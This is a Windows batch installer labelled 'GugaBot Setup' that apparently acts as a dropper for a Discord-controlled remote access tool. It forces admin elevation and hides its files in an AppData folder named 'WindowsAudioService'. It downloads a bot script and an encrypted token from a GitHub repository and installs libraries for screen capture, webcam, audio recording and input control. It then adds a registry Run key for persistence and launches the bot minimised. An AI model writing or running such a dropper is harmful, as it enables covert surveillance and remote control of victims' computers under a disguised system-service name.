@echo off
title GugaBot Setup

:: Auto-elevate to admin
net session >nul 2>&1
if errorlevel 1 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)
echo ================================
echo        GugaBot Auto Setup
echo ================================
echo.

:: Check if Python is installed
py --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Python not found! Installing...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '%TEMP%\python_installer.exe'"
    %TEMP%\python_installer.exe /quiet InstallAllUsers=0 PrependPath=1
    echo [OK] Python installed.
) else (
    echo [OK] Python found.
)

:: Create folder
set INSTALL_DIR=%USERPROFILE%\AppData\Roaming\WindowsAudioService
mkdir "%INSTALL_DIR%" 2>nul
cd /d "%INSTALL_DIR%"

echo.
echo [*] Downloading Bot.py...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Exly78/GugaBot/main/Bot.py' -OutFile 'Bot.py'"
echo [OK] Bot.py downloaded.

echo.
echo [*] Downloading launcher.bat...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Exly78/GugaBot/main/launcher.bat' -OutFile 'launcher.bat'"
echo [OK] launcher.bat downloaded.

echo.
echo [*] Downloading token.enc...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Exly78/GugaBot/main/token.enc' -OutFile 'token.enc'"
echo [OK] token.enc downloaded.

echo.
echo [*] Downloading dependencies.txt...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Exly78/GugaBot/main/dependencies.txt' -OutFile 'dependencies.txt'"
echo [OK] dependencies.txt downloaded.

echo.
echo [*] Installing dependencies...
py -m pip install --upgrade pip >nul 2>&1
py -m pip install discord.py psutil pillow opencv-python pyautogui sounddevice soundfile aiohttp
echo [OK] Dependencies installed.

echo.
echo [*] Adding to startup...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudioService" /t REG_SZ /d "cmd /c start /min \"\" \"%INSTALL_DIR%\launcher.bat\"" /f >nul
echo [OK] Added to startup.

echo.
echo ================================
echo   Setup complete! Starting bot...
echo ================================
echo.
start /min "" "%INSTALL_DIR%\launcher.bat"
exit
